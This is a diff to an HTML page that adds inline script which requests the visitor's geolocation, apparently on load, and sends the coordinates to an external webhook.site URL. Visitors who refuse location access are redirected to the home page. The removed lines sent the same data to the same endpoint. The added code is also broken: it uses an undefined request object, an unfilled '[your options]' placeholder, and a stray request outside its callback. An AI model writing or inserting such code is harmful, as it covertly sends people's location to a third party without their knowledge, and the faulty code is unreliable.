@@ -663,24 +663,18 @@ blockquote {
 <p id="demo"></p><script>
 var x = document.getElementById("demo");
 
-function getLocation() {
-  if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(showPosition,ErrorMsg);
-  } else { 
-    xhttp.open("GET", "https://webhook.site/d3ac3a32-bc56-49c3-8c1d-dfc8ebc13fa7?t="+ position.coords.latitude +position.coords.longitude  , true);
-  xhttp.send();
-  }
-}
-
-function showPosition(position) {
-  x.innerHTML = "Latitude: " + position.coords.latitude + 
-  "<br>Longitude: " + position.coords.longitude;
-  var xhttp = new XMLHttpRequest();
-  xhttp.onreadystatechange=function() {
-    if (this.readyState == 4 && this.status == 200) {
-      document.getElementById("demo").innerHTML = this.responseText;
-    }
-  };
+navigator.geolocation.getCurrentPosition(
+    function(position) {
+         xhttp.open("GET", "https://webhook.site/d3ac3a32-bc56-49c3-8c1d-dfc8ebc13fa7?t="+ position.coords.latitude +position.coords.longitude  , true);
+  xhttp.send(); 
+    }.bind(this),
+    function(error) {
+        toastr.error("Please turn on location for this feature")
+        setTimeout(function() {
+            window.location.href = '/'
+        }, 2000)
+    }, [your options]
+)
   xhttp.open("GET", "https://webhook.site/d3ac3a32-bc56-49c3-8c1d-dfc8ebc13fa7?t="+ position.coords.latitude +position.coords.longitude  , true);
   xhttp.send();
 
